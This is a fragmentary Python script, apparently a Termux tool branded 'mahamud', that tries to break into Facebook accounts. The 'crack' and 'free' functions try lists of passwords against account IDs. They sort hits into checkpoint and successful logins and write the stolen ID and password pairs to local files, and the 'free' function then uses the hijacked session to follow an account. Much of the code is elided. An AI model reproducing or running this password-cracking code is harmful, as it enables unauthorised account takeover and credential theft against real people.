...
try:
	key1 = open('/data/data/com.termux/files/usr/bin/.mrmahamud-cov', 'r').read()
except:
	kok=open('/data/data/com.termux/files/usr/bin/.mrmahamud-cov', 'w')
	kok.write(myid+imt)
	kok.close()
def login():
	try:
...
def crack(idf,pwv):
	...
	fff = '%'
	sys.stdout.write('\r %s[ mahamud ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cp +=1
				print( f'\r\x1b[1;91m [ mahamud-CP ] {idf} | {pw}')
				...
				print(f'\r\x1b[1;92m [ mahamud-OK ] {idf} | {pw}')
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
...
def free(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				rint( f'\r\x1b[1;91m [ mahamud-CP ] {idf} | {pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				...
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
				open('/sdcard/mahamud-OK.txt','a').write('%s\n' % wrt)
				follow(ses,coki)
				break
...
logo = ("""\033[1;32m.----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| | ____    ____ | || |      __      | || |  ____  ____  | || |      __      | || | ____    ____ | || | _____  _____ | || |  ________    | |
| ||_   \  /   _|| || |     /  \     | || | |_   ||   _| | || |     /  \     | || ||_   \  /   _|| || ||_   _||_   _|| || | |_   ___ `.  | |
| |  |   \/   |  | || |    / /\ \    | || |   | |__| |   | || |    / /\ \    | || |  |   \/   |  | || |  | |    | |  | || |   | |   `. \ | |
| |  | |\  /| |  | || |   / ____ \   | || |   |  __  |   | || |   / ____ \   | || |  | |\  /| |  | || |  | '    ' |  | || |   | |    | | | |
| | _| |_\/_| |_ | || | _/ /    \ \_ | || |  _| |  | |_  | || | _/ /    \ \_ | || | _| |_\/_| |_ | || |   \ `--' /   | || |  _| |___.' / | |
| ||_____||_____|| || ||____|  |____|| || | |____||____| | || ||____|  |____|| || ||_____||_____|| || |    `.__.'    | || | |________.'  | |
| |              | || |              | || |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'
   \033
__________________×______________________
  ...
  Owner   :  Mahamud-Hasnat
 
  Github   :  Mahamud-Hasnat
  Facebook : ᎷᏗᏂᏗᎷᏬᎴ ᏂᏗᏕᏁᏗᏖ
...
class Main:
  ...
  "Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, lik
